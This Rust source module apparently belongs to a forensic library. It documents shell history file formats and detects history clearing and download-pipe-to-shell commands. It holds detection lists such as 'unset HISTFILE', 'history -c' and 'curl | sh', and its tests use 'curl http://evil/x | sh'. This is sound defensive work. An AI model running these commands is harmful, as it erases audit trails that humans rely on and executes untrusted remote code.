//! Shell command-history format facts and history-tampering indicators.
//!
//! Each interactive shell persists command history in its own on-disk format.
//! The forensic value is twofold: the *commands* themselves (what was run), and
//! the *integrity* of the history file (whether an attacker cleared or disabled
//! it). This module captures both — the per-shell format markers and history
//! file names, plus the command-line patterns that disable/clear history
//! (MITRE T1070.003) or fetch-and-execute a remote payload (T1059 / T1105).
//!
//! Knowledge only — markers, file names, and indicator tables. The actual
//! history parsers (bash `#<epoch>` + multi-line, zsh `EXTENDED_HISTORY`
//! continuation, fish nearly-YAML unescape, PSReadLine backtick continuation)
//! live in the consuming reader (`shellhist-core`), per forensicnomicon's
//! knowledge-only charter.
//!
//! # Authoritative sources
//!
//! - GNU Bash Reference Manual — *Bash History Facilities* / `HISTTIMEFORMAT`
//!   (the `#<seconds-since-epoch>` comment line written before each command):
//!   <https://www.gnu.org/software/bash/manual/html_node/Bash-History-Facilities.html>
//! - Zsh manual — *Options* `EXTENDED_HISTORY` (the
//!   `: <beginning time>:<elapsed seconds>;<command>` line format):
//!   <https://zsh.sourceforge.io/Doc/Release/Options.html#History>
//! - fish-shell — `src/history/history.rs` — the `fish_history` "nearly-YAML"
//!   format (`- cmd:` / `  when:` records):
//!   <https://github.com/fish-shell/fish-shell/blob/master/src/history/history.rs>
//! - PowerShell PSReadLine — `ConsoleHost_history.txt` plain-text history with
//!   backtick line continuation:
//!   <https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline>
//! - MITRE ATT&CK — T1070.003 Indicator Removal: Clear Command History;
//!   T1059 Command and Scripting Interpreter; T1105 Ingress Tool Transfer:
//!   <https://attack.mitre.org/techniques/T1070/003/> ·
//!   <https://attack.mitre.org/techniques/T1059/> ·
//!   <https://attack.mitre.org/techniques/T1105/>

/// An interactive shell whose command history this module describes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Shell {
    /// GNU Bash — `.bash_history`.
    Bash,
    /// Z shell — `.zsh_history`.
    Zsh,
    /// fish — `fish_history`.
    Fish,
    /// PowerShell PSReadLine — `ConsoleHost_history.txt`.
    PowerShell,
}

/// bash timestamp comment prefix: with `HISTTIMEFORMAT` set, bash writes a
/// `#<unix-epoch>` line before each command.
pub const BASH_TIMESTAMP_PREFIX: &str = "#";

/// zsh `EXTENDED_HISTORY` entry prefix — each entry begins `: ` followed by
/// `<start-epoch>:<elapsed-seconds>;<command>`.
pub const ZSH_EXTENDED_ENTRY_PREFIX: &str = ": ";

/// zsh `EXTENDED_HISTORY` separator between the `:start:elapsed` metadata and
/// the command text.
pub const ZSH_EXTENDED_FIELD_SEPARATOR: char = ';';

/// fish `fish_history` command-record prefix (nearly-YAML `- cmd: <command>`).
pub const FISH_CMD_PREFIX: &str = "- cmd: ";

/// fish `fish_history` timestamp-record prefix (`  when: <unix-epoch>`).
pub const FISH_WHEN_PREFIX: &str = "  when: ";

/// The default history file name for a shell.
#[must_use]
pub fn history_file_name(shell: Shell) -> &'static str {
    match shell {
        Shell::Bash => ".bash_history",
        Shell::Zsh => ".zsh_history",
        Shell::Fish => "fish_history",
        Shell::PowerShell => "ConsoleHost_history.txt",
    }
}

/// Whether a shell's history format records a per-command timestamp by default.
///
/// zsh `EXTENDED_HISTORY` and fish always store the epoch; bash records one
/// only when `HISTTIMEFORMAT` is set (so the plain default does not — returns
/// `false`); PSReadLine never stores per-command times.
#[must_use]
pub fn records_timestamps(shell: Shell) -> bool {
    matches!(shell, Shell::Zsh | Shell::Fish)
}

/// Command-line substrings that **clear or disable** shell command history —
/// the canonical anti-forensic moves (MITRE T1070.003). Matched
/// case-insensitively by [`is_history_tampering`].
pub const HISTORY_CLEARING_PATTERNS: &[&str] = &[
    "history -c",
    "history -w",
    "unset HISTFILE",
    "HISTFILE=/dev/null",
    "HISTFILE=",
    "HISTSIZE=0",
    "HISTFILESIZE=0",
    "set +o history",
    "rm ~/.bash_history",
    "rm -f ~/.bash_history",
    "cat /dev/null >",
    "Clear-History",
    "Remove-Item (Get-PSReadlineOption).HistorySavePath",
];

/// Command-line substrings that **fetch a remote payload and pipe it straight
/// into a shell** — the download-cradle pattern (MITRE T1059 / T1105). Matched
/// case-insensitively by [`is_download_pipe_to_shell`].
pub const DOWNLOAD_PIPE_TO_SHELL_PATTERNS: &[&str] = &[
    "curl | sh",
    "curl | bash",
    "wget | sh",
    "wget | bash",
    "curl |sh",
    "curl |bash",
    "wget |sh",
    "wget |bash",
    "iwr | iex",
    "invoke-webrequest | invoke-expression",
];

/// MITRE techniques history clearing/disabling is consistent with (Indicator
/// Removal: Clear Command History).
pub const MITRE_HISTORY_CLEARING: &[&str] = &["T1070.003"];

/// MITRE techniques a download-pipe-to-shell cradle is consistent with
/// (Command and Scripting Interpreter / Ingress Tool Transfer).
pub const MITRE_DOWNLOAD_PIPE_TO_SHELL: &[&str] = &["T1059", "T1105"];

/// Whether `cmd` contains a history-clearing/disabling pattern
/// ([`HISTORY_CLEARING_PATTERNS`]), matched case-insensitively as a substring.
#[must_use]
pub fn is_history_tampering(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    HISTORY_CLEARING_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Whether `cmd` is a download-pipe-to-shell cradle: a `curl`/`wget`/
/// `Invoke-WebRequest` fetch piped into `sh`/`bash`/`Invoke-Expression`.
///
/// Generalizes past the fixed [`DOWNLOAD_PIPE_TO_SHELL_PATTERNS`] table:
/// matches any command that pipes (`|`) from a known downloader into a known
/// shell, regardless of the intervening URL/flags.
#[must_use]
pub fn is_download_pipe_to_shell(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    let Some((before, after)) = lower.split_once('|') else {
        return false;
    };
    let has_downloader = ["curl", "wget", "invoke-webrequest", "iwr"]
        .iter()
        .any(|d| before.contains(d));
    let into_shell = ["sh", "bash", "zsh", "invoke-expression", "iex"]
        .iter()
        .any(|s| after.contains(s));
    has_downloader && into_shell
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_variants_exist() {
        let _ = [Shell::Bash, Shell::Zsh, Shell::Fish, Shell::PowerShell];
    }

    #[test]
    fn history_file_names() {
        assert_eq!(history_file_name(Shell::Bash), ".bash_history");
        assert_eq!(history_file_name(Shell::Zsh), ".zsh_history");
        assert_eq!(history_file_name(Shell::Fish), "fish_history");
        assert_eq!(
            history_file_name(Shell::PowerShell),
            "ConsoleHost_history.txt"
        );
    }

    #[test]
    fn bash_timestamp_marker() {
        // bash with HISTTIMEFORMAT writes a `#<unix-epoch>` comment line before
        // each command.
        assert_eq!(BASH_TIMESTAMP_PREFIX, "#");
    }

    #[test]
    fn zsh_extended_history_marker() {
        // zsh EXTENDED_HISTORY: `: <start>:<elapsed>;<command>`
        assert_eq!(ZSH_EXTENDED_ENTRY_PREFIX, ": ");
        assert_eq!(ZSH_EXTENDED_FIELD_SEPARATOR, ';');
    }

    #[test]
    fn fish_yaml_markers() {
        // fish_history is nearly-YAML: `- cmd:` records with `  when:` epochs.
        assert_eq!(FISH_CMD_PREFIX, "- cmd: ");
        assert_eq!(FISH_WHEN_PREFIX, "  when: ");
    }

    #[test]
    fn records_timestamps_predicate() {
        assert!(records_timestamps(Shell::Zsh));
        assert!(records_timestamps(Shell::Fish));
        // bash only with HISTTIMEFORMAT; PSReadLine never.
        assert!(!records_timestamps(Shell::PowerShell));
    }

    #[test]
    fn history_clearing_patterns_present() {
        assert!(HISTORY_CLEARING_PATTERNS.contains(&"history -c"));
        assert!(HISTORY_CLEARING_PATTERNS.contains(&"unset HISTFILE"));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("HISTFILE=/dev/null")));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("HISTSIZE=0")));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("set +o history")));
    }

    #[test]
    fn is_history_tampering_is_case_insensitive_substring() {
        assert!(is_history_tampering("  history -c  "));
        assert!(is_history_tampering("export HISTFILE=/dev/null"));
        assert!(is_history_tampering("UNSET HISTFILE"));
        assert!(!is_history_tampering("ls -la"));
    }

    #[test]
    fn download_pipe_to_shell_patterns_present() {
        assert!(DOWNLOAD_PIPE_TO_SHELL_PATTERNS
            .iter()
            .any(|p| p.contains("curl") && p.contains("sh")));
        assert!(DOWNLOAD_PIPE_TO_SHELL_PATTERNS
            .iter()
            .any(|p| p.contains("wget") && p.contains("sh")));
    }

    #[test]
    fn is_download_pipe_to_shell_matches() {
        assert!(is_download_pipe_to_shell("curl http://evil/x | sh"));
        assert!(is_download_pipe_to_shell("wget -qO- http://evil/x | bash"));
        assert!(!is_download_pipe_to_shell(
            "curl http://example.com -o file"
        ));
    }

    #[test]
    fn mitre_constants() {
        assert_eq!(MITRE_HISTORY_CLEARING, &["T1070.003"]);
        assert_eq!(MITRE_DOWNLOAD_PIPE_TO_SHELL, &["T1059", "T1105"]);
    }
}
